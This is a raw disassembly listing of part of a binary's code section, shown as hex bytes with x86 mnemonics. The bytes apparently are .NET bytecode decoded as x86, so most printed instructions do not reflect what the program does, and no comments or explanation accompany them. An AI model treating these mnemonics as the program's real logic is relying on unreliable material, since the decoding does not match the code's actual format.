  402b92:	6f                   	outsl  %ds:(%esi),(%dx)
  402b93:	39 00                	cmp    %eax,(%eax)
  402b95:	00 0a                	add    %cl,(%edx)
  402b97:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b9a:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b9f:	0c 00                	or     $0x0,%al
  402ba1:	00 06                	add    %al,(%esi)
  402ba3:	d4 8d                	aam    $0x8d
  402ba5:	44                   	inc    %esp
  402ba6:	00 00                	add    %al,(%eax)
  402ba8:	01 28                	add    %ebp,(%eax)
  402baa:	0b 00                	or     (%eax),%eax
  402bac:	00 06                	add    %al,(%esi)
  402bae:	16                   	push   %ss
  402baf:	6a 28                	push   $0x28
  402bb1:	0f 00 00             	sldt   (%eax)
  402bb4:	06                   	push   %es
  402bb5:	28 2f                	sub    %ch,(%edi)
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	06                   	push   %es
  402bba:	28 20                	sub    %ah,(%eax)
  402bbc:	00 00                	add    %al,(%eax)
  402bbe:	06                   	push   %es
  402bbf:	16                   	push   %ss
  402bc0:	28 18                	sub    %bl,(%eax)
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	06                   	push   %es
  402bc5:	16                   	push   %ss
  402bc6:	28 1a                	sub    %bl,(%edx)
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	06                   	push   %es
  402bcb:	14 fe                	adc    $0xfe,%al
  402bcd:	06                   	push   %es
  402bce:	21 00                	and    %eax,(%eax)
  402bd0:	00 06                	add    %al,(%esi)
  402bd2:	73 3a                	jae    0x402c0e
  402bd4:	00 00                	add    %al,(%eax)
  402bd6:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402bd9:	27                   	daa
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	0a 20                	or     (%eax),%ah
  402bde:	10 27                	adc    %ah,(%edi)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402be8:	32 00                	xor    (%eax),%al
  402bea:	00 0a                	add    %cl,(%edx)
  402bec:	73 27                	jae    0x402c15
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	0a 20                	or     (%eax),%ah
  402bf2:	10 27                	adc    %ah,(%edi)
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402bfc:	32 00                	xor    (%eax),%al
  402bfe:	00 0a                	add    %cl,(%edx)
  402c00:	73 3b                	jae    0x402c3d
  402c02:	00 00                	add    %al,(%eax)
  402c04:	0a 28                	or     (%eax),%ch
  402c06:	11 00                	adc    %eax,(%eax)
  402c08:	00 06                	add    %al,(%esi)
  402c0a:	14 fe                	adc    $0xfe,%al
  402c0c:	06                   	push   %es
  402c0d:	22 00                	and    (%eax),%al
  402c0f:	00 06                	add    %al,(%esi)
  402c11:	73 3a                	jae    0x402c4d
  402c13:	00 00                	add    %al,(%eax)
  402c15:	0a 14 17             	or     (%edi,%edx,1),%dl
  402c18:	17                   	pop    %ss
  402c19:	73 3b                	jae    0x402c56
  402c1b:	00 00                	add    %al,(%eax)
  402c1d:	0a 28                	or     (%eax),%ch
  402c1f:	16                   	push   %ss
  402c20:	00 00                	add    %al,(%eax)
  402c22:	06                   	push   %es
  402c23:	28 08                	sub    %cl,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	06                   	push   %es
  402c28:	28 0a                	sub    %cl,(%edx)
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	06                   	push   %es
  402c2d:	28 0e                	sub    %cl,(%esi)
  402c2f:	00 00                	add    %al,(%eax)
  402c31:	06                   	push   %es
  402c32:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402c38:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402c3f:	06                   	push   %es
  402c40:	73 3c                	jae    0x402c7e
  402c42:	00 00                	add    %al,(%eax)
  402c44:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402c47:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402c4c:	38 06                	cmp    %al,(%esi)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	00 16                	add    %dl,(%esi)
  402c52:	28 13                	sub    %dl,(%ebx)
  402c54:	00 00                	add    %al,(%eax)
  402c56:	06                   	push   %es
  402c57:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402c5a:	00 00                	add    %al,(%eax)
  402c5c:	26 16                	es push %ss
  402c5e:	28 13                	sub    %dl,(%ebx)
  402c60:	00 00                	add    %al,(%eax)
  402c62:	06                   	push   %es
  402c63:	dd 00                	fldl   (%eax)
  402c65:	00 00                	add    %al,(%eax)
  402c67:	00 2a                	add    %ch,(%edx)
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	00 41 4c             	add    %al,0x4c(%ecx)
  402c6e:	00 00                	add    %al,(%eax)
  402c70:	00 00                	add    %al,(%eax)
  402c72:	00 00                	add    %al,(%eax)
  402c74:	ce                   	into
  402c75:	00 00                	add    %al,(%eax)
  402c77:	00 26                	add    %ah,(%esi)
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	00 f4                	add    %dh,%ah
  402c7d:	00 00                	add    %al,(%eax)
  402c7f:	00 06                	add    %al,(%esi)
  402c81:	00 00                	add    %al,(%eax)
  402c83:	00 01                	add    %al,(%ecx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	01 02                	add    %eax,(%edx)
  402c89:	00 00                	add    %al,(%eax)
  402c8b:	00 21                	add    %ah,(%ecx)
  402c8d:	01 00                	add    %eax,(%eax)
  402c8f:	00 82 00 00 00 a3    	add    %al,-0x5d000000(%edx)
  402c95:	01 00                	add    %eax,(%eax)
  402c97:	00 0f                	add    %cl,(%edi)
	...
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	00 e4                	add    %ah,%ah
  402ca9:	02 00                	add    (%eax),%al
  402cab:	00 e4                	add    %ah,%ah
  402cad:	02 00                	add    (%eax),%al
  402caf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	01 00                	add    %eax,(%eax)
  402cb6:	00 01                	add    %al,(%ecx)
  402cb8:	1b 30                	sbb    (%eax),%esi
  402cba:	02 00                	add    (%eax),%al
  402cbc:	6a 00                	push   $0x0
  402cbe:	00 00                	add    %al,(%eax)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	28 08                	sub    %cl,(%eax)
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	06                   	push   %es
  402cc9:	25 3a 06 00 00       	and    $0x63a,%eax
  402cce:	00 26                	add    %ah,(%esi)
  402cd0:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cd6:	40                   	inc    %eax
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	0a 28                	or     (%eax),%ch
  402cdb:	06                   	push   %es
  402cdc:	00 00                	add    %al,(%eax)
  402cde:	06                   	push   %es
  402cdf:	25 3a 06 00 00       	and    $0x63a,%eax
  402ce4:	00 26                	add    %ah,(%esi)
  402ce6:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cec:	41                   	inc    %ecx
  402ced:	00 00                	add    %al,(%eax)
  402cef:	0a 28                	or     (%eax),%ch
  402cf1:	15 00 00 06 25       	adc    $0x25060000,%eax
  402cf6:	3a 06                	cmp    (%esi),%al
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	00 26                	add    %ah,(%esi)
  402cfc:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d02:	42                   	inc    %edx
  402d03:	00 00                	add    %al,(%eax)
  402d05:	0a 28                	or     (%eax),%ch
  402d07:	10 00                	adc    %al,(%eax)
  402d09:	00 06                	add    %al,(%esi)
  402d0b:	25 3a 06 00 00       	and    $0x63a,%eax
  402d10:	00 26                	add    %ah,(%esi)
  402d12:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d18:	42                   	inc    %edx
  402d19:	00 00                	add    %al,(%eax)
  402d1b:	0a dd                	or     %ch,%bl
  402d1d:	06                   	push   %es
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	00 26                	add    %ah,(%esi)
  402d22:	dd 00                	fldl   (%eax)
  402d24:	00 00                	add    %al,(%eax)
  402d26:	00 16                	add    %dl,(%esi)
  402d28:	28 13                	sub    %dl,(%ebx)
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	06                   	push   %es
  402d2d:	2a 00                	sub    (%eax),%al
  402d2f:	00 01                	add    %al,(%ecx)
  402d31:	10 00                	adc    %al,(%eax)
  402d33:	00 00                	add    %al,(%eax)
  402d35:	00 00                	add    %al,(%eax)
  402d37:	00 5d 5d             	add    %bl,0x5d(%ebp)
  402d3a:	00 06                	add    %al,(%esi)
  402d3c:	01 00                	add    %eax,(%eax)
  402d3e:	00 01                	add    %al,(%ecx)
  402d40:	1b 30                	sbb    (%eax),%esi
  402d42:	06                   	push   %es
  402d43:	00 ba 01 00 00 04    	add    %bh,0x4000001(%edx)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	11 28                	adc    %ebp,(%eax)
  402d4d:	06                   	push   %es
  402d4e:	00 00                	add    %al,(%eax)
  402d50:	06                   	push   %es
  402d51:	6f                   	outsl  %ds:(%esi),(%dx)
  402d52:	2b 00                	sub    (%eax),%eax
  402d54:	00 0a                	add    %cl,(%edx)
  402d56:	39 0a                	cmp    %ecx,(%edx)
  402d58:	00 00                	add    %al,(%eax)
  402d5a:	00 28                	add    %ch,(%eax)
  402d5c:	12 00                	adc    (%eax),%al
  402d5e:	00 06                	add    %al,(%esi)
  402d60:	3a 0b                	cmp    (%ebx),%cl
  402d62:	00 00                	add    %al,(%eax)
  402d64:	00 16                	add    %dl,(%esi)
  402d66:	28 13                	sub    %dl,(%ebx)
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	06                   	push   %es
  402d6b:	dd 95 01 00 00 28    	fstl   0x28000001(%ebp)
  402d71:	08 00                	or     %al,(%eax)
  402d73:	00 06                	add    %al,(%esi)
  402d75:	02 6f 43             	add    0x43(%edi),%ch
  402d78:	00 00                	add    %al,(%eax)
  402d7a:	0a 0a                	or     (%edx),%cl
  402d7c:	06                   	push   %es
  402d7d:	16                   	push   %ss
  402d7e:	3e 6b 01 00          	imul   $0x0,%ds:(%ecx),%eax
  402d82:	00 28                	add    %ch,(%eax)
  402d84:	0e                   	push   %cs
  402d85:	00 00                	add    %al,(%eax)
  402d87:	06                   	push   %es
  402d88:	06                   	push   %es
  402d89:	6a 58                	push   $0x58
  402d8b:	28 0f                	sub    %cl,(%edi)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	06                   	push   %es
  402d90:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d93:	00 06                	add    %al,(%esi)
  402d95:	06                   	push   %es
  402d96:	6a 59                	push   $0x59
  402d98:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d9e:	0c 00                	or     $0x0,%al
  402da0:	00 06                	add    %al,(%esi)
  402da2:	3a 02                	cmp    (%edx),%al
  402da4:	01 00                	add    %eax,(%eax)
  402da6:	00 28                	add    %ch,(%eax)
  402da8:	0a 00                	or     (%eax),%al
  402daa:	00 06                	add    %al,(%esi)
  402dac:	16                   	push   %ss
  402dad:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402db1:	0a 6a 28             	or     0x28(%edx),%ch
  402db4:	0d 00 00 06 28       	or     $0x28060000,%eax
  402db9:	0c 00                	or     $0x0,%al
  402dbb:	00 06                	add    %al,(%esi)
  402dbd:	16                   	push   %ss
  402dbe:	6a 3e                	push   $0x3e
  402dc0:	c2 00 00             	ret    $0x0
  402dc3:	00 16                	add    %dl,(%esi)
  402dc5:	6a 28                	push   $0x28
  402dc7:	0f 00 00             	sldt   (%eax)
  402dca:	06                   	push   %es
  402dcb:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402dce:	00 06                	add    %al,(%esi)
  402dd0:	d4 8d                	aam    $0x8d
  402dd2:	44                   	inc    %esp
  402dd3:	00 00                	add    %al,(%eax)
  402dd5:	01 28                	add    %ebp,(%eax)
  402dd7:	0b 00                	or     (%eax),%eax
  402dd9:	00 06                	add    %al,(%esi)
  402ddb:	38 5f 00             	cmp    %bl,0x0(%edi)
  402dde:	00 00                	add    %al,(%eax)
  402de0:	28 08                	sub    %cl,(%eax)
  402de2:	00 00                	add    %al,(%eax)
  402de4:	06                   	push   %es
  402de5:	28 0a                	sub    %cl,(%edx)
  402de7:	00 00                	add    %al,(%eax)
  402de9:	06                   	push   %es
  402dea:	28 0e                	sub    %cl,(%esi)
  402dec:	00 00                	add    %al,(%eax)
  402dee:	06                   	push   %es
  402def:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402df5:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402dfc:	07                   	pop    %es
  402dfd:	16                   	push   %ss
  402dfe:	3d 0b 00 00 00       	cmp    $0xb,%eax
  402e03:	16                   	push   %ss
  402e04:	28 13                	sub    %dl,(%ebx)
  402e06:	00 00                	add    %al,(%eax)
  402e08:	06                   	push   %es
  402e09:	dd f7                	(bad)
  402e0b:	00 00                	add    %al,(%eax)
  402e0d:	00 28                	add    %ch,(%eax)
  402e0f:	0e                   	push   %cs
  402e10:	00 00                	add    %al,(%eax)
  402e12:	06                   	push   %es
  402e13:	07                   	pop    %es
  402e14:	6a 58                	push   $0x58
  402e16:	28 0f                	sub    %cl,(%edi)
  402e18:	00 00                	add    %al,(%eax)
  402e1a:	06                   	push   %es
  402e1b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402e1e:	00 06                	add    %al,(%esi)
  402e20:	07                   	pop    %es
  402e21:	6a 59                	push   $0x59
  402e23:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402e29:	0c 00                	or     $0x0,%al
  402e2b:	00 06                	add    %al,(%esi)
  402e2d:	16                   	push   %ss
  402e2e:	6a 3c                	push   $0x3c
  402e30:	0b 00                	or     (%eax),%eax
  402e32:	00 00                	add    %al,(%eax)
  402e34:	16                   	push   %ss
  402e35:	28 13                	sub    %dl,(%ebx)
  402e37:	00 00                	add    %al,(%eax)
  402e39:	06                   	push   %es
  402e3a:	dd c6                	ffree  %st(6)
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	00 28                	add    %ch,(%eax)
  402e40:	0c 00                	or     $0x0,%al
  402e42:	00 06                	add    %al,(%esi)
  402e44:	16                   	push   %ss
  402e45:	6a 30                	push   $0x30
  402e47:	98                   	cwtl
  402e48:	14 fe                	adc    $0xfe,%al
  402e4a:	06                   	push   %es
  402e4b:	46                   	inc    %esi
  402e4c:	00 00                	add    %al,(%eax)
  402e4e:	06                   	push   %es
  402e4f:	73 46                	jae    0x402e97
  402e51:	00 00                	add    %al,(%eax)
  402e53:	0a 73 47             	or     0x47(%ebx),%dh
  402e56:	00 00                	add    %al,(%eax)
  402e58:	0a 28                	or     (%eax),%ch
  402e5a:	0a 00                	or     (%eax),%al
  402e5c:	00 06                	add    %al,(%esi)
  402e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e5f:	48                   	dec    %eax
  402e60:	00 00                	add    %al,(%eax)
  402e62:	0a 16                	or     (%esi),%dl
  402e64:	6a 28                	push   $0x28
  402e66:	0f 00 00             	sldt   (%eax)
  402e69:	06                   	push   %es
  402e6a:	1a 6a 28             	sbb    0x28(%edx),%ch
  402e6d:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e72:	0c 00                	or     $0x0,%al
  402e74:	00 06                	add    %al,(%esi)
  402e76:	d4 8d                	aam    $0x8d
  402e78:	44                   	inc    %esp
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	01 28                	add    %ebp,(%eax)
  402e7d:	0b 00                	or     (%eax),%eax
  402e7f:	00 06                	add    %al,(%esi)
  402e81:	38 3a                	cmp    %bh,(%edx)
  402e83:	00 00                	add    %al,(%eax)
  402e85:	00 1a                	add    %bl,(%edx)
  402e87:	6a 28                	push   $0x28
  402e89:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e8e:	0c 00                	or     $0x0,%al
  402e90:	00 06                	add    %al,(%esi)
  402e92:	d4 8d                	aam    $0x8d
  402e94:	44                   	inc    %esp
  402e95:	00 00                	add    %al,(%eax)
  402e97:	01 28                	add    %ebp,(%eax)
  402e99:	0b 00                	or     (%eax),%eax
  402e9b:	00 06                	add    %al,(%esi)
  402e9d:	16                   	push   %ss
  402e9e:	6a 28                	push   $0x28
  402ea0:	0f 00 00             	sldt   (%eax)
  402ea3:	06                   	push   %es
  402ea4:	38 17                	cmp    %dl,(%edi)
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	00 28                	add    %ch,(%eax)
  402eaa:	0c 00                	or     $0x0,%al
  402eac:	00 06                	add    %al,(%esi)
  402eae:	16                   	push   %ss
  402eaf:	6a 3c                	push   $0x3c
  402eb1:	0b 00                	or     (%eax),%eax
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	16                   	push   %ss
  402eb6:	28 13                	sub    %dl,(%ebx)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	06                   	push   %es
  402ebb:	dd 45 00             	fldl   0x0(%ebp)
  402ebe:	00 00                	add    %al,(%eax)
  402ec0:	28 08                	sub    %cl,(%eax)
  402ec2:	00 00                	add    %al,(%eax)
  402ec4:	06                   	push   %es
  402ec5:	28 0a                	sub    %cl,(%edx)
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	06                   	push   %es
  402eca:	28 0e                	sub    %cl,(%esi)
  402ecc:	00 00                	add    %al,(%eax)
  402ece:	06                   	push   %es
  402ecf:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402ed5:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402edc:	06                   	push   %es
  402edd:	73 3c                	jae    0x402f1b
  402edf:	00 00                	add    %al,(%eax)
  402ee1:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402ee4:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402ee9:	38 06                	cmp    %al,(%esi)
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	00 16                	add    %dl,(%esi)
  402eef:	28 13                	sub    %dl,(%ebx)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	06                   	push   %es
  402ef4:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402ef7:	00 00                	add    %al,(%eax)
  402ef9:	26 16                	es push %ss
  402efb:	28 13                	sub    %dl,(%ebx)
  402efd:	00 00                	add    %al,(%eax)
  402eff:	06                   	push   %es
  402f00:	dd 00                	fldl   (%eax)
  402f02:	00 00                	add    %al,(%eax)
  402f04:	00 2a                	add    %ch,(%edx)
  402f06:	00 00                	add    %al,(%eax)
  402f08:	41                   	inc    %ecx
  402f09:	1c 00                	sbb    $0x0,%al
	...
  402f13:	00 ad 01 00 00 ad    	add    %ch,-0x52ffffff(%ebp)
  402f19:	01 00                	add    %eax,(%eax)
  402f1b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402f1e:	00 00                	add    %al,(%eax)
  402f20:	01 00                	add    %eax,(%eax)
  402f22:	00 01                	add    %al,(%ecx)
  402f24:	1b 30                	sbb    (%eax),%esi
  402f26:	04 00                	add    $0x0,%al
  402f28:	04 01                	add    $0x1,%al
  402f2a:	00 00                	add    %al,(%eax)
  402f2c:	05 00 00 11 28       	add    $0x28110000,%eax
  402f31:	14 00                	adc    $0x0,%al
  402f33:	00 06                	add    %al,(%esi)
  402f35:	0a 16                	or     (%esi),%dl
  402f37:	0b 06                	or     (%esi),%eax
  402f39:	12 01                	adc    (%ecx),%al
  402f3b:	28 49 00             	sub    %cl,0x0(%ecx)
  402f3e:	00 0a                	add    %cl,(%edx)
  402f40:	28 12                	sub    %dl,(%edx)
  402f42:	00 00                	add    %al,(%eax)
  402f44:	06                   	push   %es
  402f45:	3a 05 00 00 00 dd    	cmp    0xdd000000,%al
  402f4b:	e4 00                	in     $0x0,%al
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402f55:	00 0a                	add    %cl,(%edx)
  402f57:	0c 28                	or     $0x28,%al
  402f59:	06                   	push   %es
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	06                   	push   %es
  402f5d:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f62:	00 0a                	add    %cl,(%edx)
  402f64:	26 28 08             	sub    %cl,%es:(%eax)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	06                   	push   %es
  402f6a:	08 16                	or     %dl,(%esi)
  402f6c:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402f72:	00 0a                	add    %cl,(%edx)
  402f74:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402f7a:	0f 00                	(bad)
  402f7c:	3e 6e                	outsb  %ds:(%esi),(%dx)
  402f7e:	00 00                	add    %al,(%eax)
  402f80:	00 02                	add    %al,(%edx)
  402f82:	73 4d                	jae    0x402fd1
  402f84:	00 00                	add    %al,(%eax)
  402f86:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402f8c:	16                   	push   %ss
  402f8d:	6a 6f                	push   $0x6f
  402f8f:	4e                   	dec    %esi
  402f90:	00 00                	add    %al,(%eax)
  402f92:	0a 20                	or     (%eax),%ah
  402f94:	50                   	push   %eax
  402f95:	c3                   	ret
  402f96:	00 00                	add    %al,(%eax)
  402f98:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402f9c:	01 13                	add    %edx,(%ebx)
  402f9e:	05 38 26 00 00       	add    $0x2638,%eax
  402fa3:	00 28                	add    %ch,(%eax)
  402fa5:	06                   	push   %es
  402fa6:	00 00                	add    %al,(%eax)
  402fa8:	06                   	push   %es
  402fa9:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402fae:	00 0a                	add    %cl,(%edx)
  402fb0:	26 28 08             	sub    %cl,%es:(%eax)
  402fb3:	00 00                	add    %al,(%eax)
  402fb5:	06                   	push   %es
  402fb6:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402fbc:	4c                   	dec    %esp
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	0a 28                	or     (%eax),%ch
  402fc1:	08 00                	or     %al,(%eax)
  402fc3:	00 06                	add    %al,(%esi)
  402fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc6:	4f                   	dec    %edi
  402fc7:	00 00                	add    %al,(%eax)
  402fc9:	0a 09                	or     (%ecx),%cl
  402fcb:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402fd1:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402fd8:	13 04 16             	adc    (%esi,%edx,1),%eax
  402fdb:	30 c7                	xor    %al,%bh
  402fdd:	dd 33                	fnsave (%ebx)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	00 09                	add    %cl,(%ecx)
  402fe3:	39 06                	cmp    %eax,(%esi)
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	00 09                	add    %cl,(%ecx)
  402fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  402fea:	33 00                	xor    (%eax),%eax
  402fec:	00 0a                	add    %cl,(%edx)
  402fee:	dc 28                	fsubrl (%eax)
  402ff0:	06                   	push   %es
  402ff1:	00 00                	add    %al,(%eax)
  402ff3:	06                   	push   %es
  402ff4:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402ff9:	00 0a                	add    %cl,(%edx)
  402ffb:	26 28 08             	sub    %cl,%es:(%eax)
  402ffe:	00 00                	add    %al,(%eax)
  403000:	06                   	push   %es
  403001:	02 16                	add    (%esi),%dl
  403003:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  403009:	00 0a                	add    %cl,(%edx)
  40300b:	28 08                	sub    %cl,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	06                   	push   %es
  403010:	6f                   	outsl  %ds:(%esi),(%dx)
  403011:	4f                   	dec    %edi
  403012:	00 00                	add    %al,(%eax)
  403014:	0a dd                	or     %ch,%bl
  403016:	19 00                	sbb    %eax,(%eax)
  403018:	00 00                	add    %al,(%eax)
  40301a:	26 16                	es push %ss
  40301c:	28 13                	sub    %dl,(%ebx)
  40301e:	00 00                	add    %al,(%eax)
  403020:	06                   	push   %es
  403021:	dd 0d 00 00 00 07    	fisttpll 0x7000000
  403027:	39 06                	cmp    %eax,(%esi)
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 06                	add    %al,(%esi)
  40302d:	28 50 00             	sub    %dl,0x0(%eax)
  403030:	00 0a                	add    %cl,(%edx)
  403032:	dc 2a                	fsubrl (%edx)
  403034:	01 28                	add    %ebp,(%eax)
  403036:	00 00                	add    %al,(%eax)
  403038:	02 00                	add    (%eax),%al
  40303a:	58                   	pop    %eax
  40303b:	00 5a b2             	add    %bl,-0x4e(%edx)
  40303e:	00 0d 00 00 00 00    	add    %cl,0x0
  403044:	00 00                	add    %al,(%eax)
  403046:	10 00                	adc    %al,(%eax)
  403048:	da ea                	(bad)
  40304a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	01 02                	add    %eax,(%edx)
  403051:	00 08                	add    %cl,(%eax)
  403053:	00 ee                	add    %ch,%dh
  403055:	f6 00 0d             	testb  $0xd,(%eax)
  403058:	00 00                	add    %al,(%eax)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	1b 30                	sbb    (%eax),%esi
  40305e:	03 00                	add    (%eax),%eax
  403060:	50                   	push   %eax
  403061:	00 00                	add    %al,(%eax)
  403063:	00 00                	add    %al,(%eax)
  403065:	00 00                	add    %al,(%eax)
  403067:	00 73 94             	add    %dh,-0x6c(%ebx)
  40306a:	00 00                	add    %al,(%eax)
  40306c:	06                   	push   %es
  40306d:	25 72 52 21 00       	and    $0x215272,%eax
  403072:	70 6f                	jo     0x4030e3
  403074:	7f 00                	jg     0x403076
  403076:	00 06                	add    %al,(%esi)
  403078:	72 60                	jb     0x4030da
  40307a:	21 00                	and    %eax,(%eax)
  40307c:	70 6f                	jo     0x4030ed
  40307e:	8c 00                	mov    %es,(%eax)
  403080:	00 06                	add    %al,(%esi)
  403082:	25 72 6a 21 00       	and    $0x216a72,%eax
  403087:	70 6f                	jo     0x4030f8
  403089:	7f 00                	jg     0x40308b
  40308b:	00 06                	add    %al,(%esi)
  40308d:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  403093:	8c 00                	mov    %es,(%eax)
  403095:	00 06                	add    %al,(%esi)
  403097:	6f                   	outsl  %ds:(%esi),(%dx)
  403098:	89 00                	mov    %eax,(%eax)
  40309a:	00 06                	add    %al,(%esi)
  40309c:	28 20                	sub    %ah,(%eax)
  40309e:	00 00                	add    %al,(%eax)
  4030a0:	06                   	push   %es
  4030a1:	28 51 00             	sub    %dl,0x0(%ecx)
  4030a4:	00 0a                	add    %cl,(%edx)
  4030a6:	17                   	pop    %ss
  4030a7:	28 1a                	sub    %bl,(%edx)
  4030a9:	00 00                	add    %al,(%eax)
  4030ab:	06                   	push   %es
  4030ac:	dd 06                	fldl   (%esi)
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	00 26                	add    %ah,(%esi)
  4030b2:	dd 00                	fldl   (%eax)
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	00 2a                	add    %ch,(%edx)
  4030b8:	01 10                	add    %edx,(%eax)
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	49                   	dec    %ecx
  4030c1:	49                   	dec    %ecx
  4030c2:	00 06                	add    %al,(%esi)
  4030c4:	01 00                	add    %eax,(%eax)
  4030c6:	00 01                	add    %al,(%ecx)
  4030c8:	1b 30                	sbb    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	2c 00                	sub    $0x0,%al
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	00 00                	add    %al,(%eax)
  4030d2:	00 00                	add    %al,(%eax)
  4030d4:	28 19                	sub    %bl,(%ecx)
  4030d6:	00 00                	add    %al,(%eax)
  4030d8:	06                   	push   %es
  4030d9:	39 16                	cmp    %edx,(%esi)
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	00 28                	add    %ch,(%eax)
  4030df:	12 00                	adc    (%eax),%al
  4030e1:	00 06                	add    %al,(%esi)
  4030e3:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	28 17                	sub    %dl,(%edi)
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	06                   	push   %es
  4030ed:	17                   	pop    %ss
  4030ee:	58                   	pop    %eax
  4030ef:	28 18                	sub    %bl,(%eax)
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	06                   	push   %es
  4030f4:	dd 06                	fldl   (%esi)
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	00 26                	add    %ah,(%esi)
  4030fa:	dd 00                	fldl   (%eax)
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	00 2a                	add    %ch,(%edx)
  403100:	01 10                	add    %edx,(%eax)
  403102:	00 00                	add    %al,(%eax)
  403104:	00 00                	add    %al,(%eax)
  403106:	00 00                	add    %al,(%eax)
  403108:	25 25 00 06 01       	and    $0x1060025,%eax
  40310d:	00 00                	add    %al,(%eax)
  40310f:	01 1b                	add    %ebx,(%ebx)
  403111:	30 05 00 76 02 00    	xor    %al,0x27600
  403117:	00 06                	add    %al,(%esi)
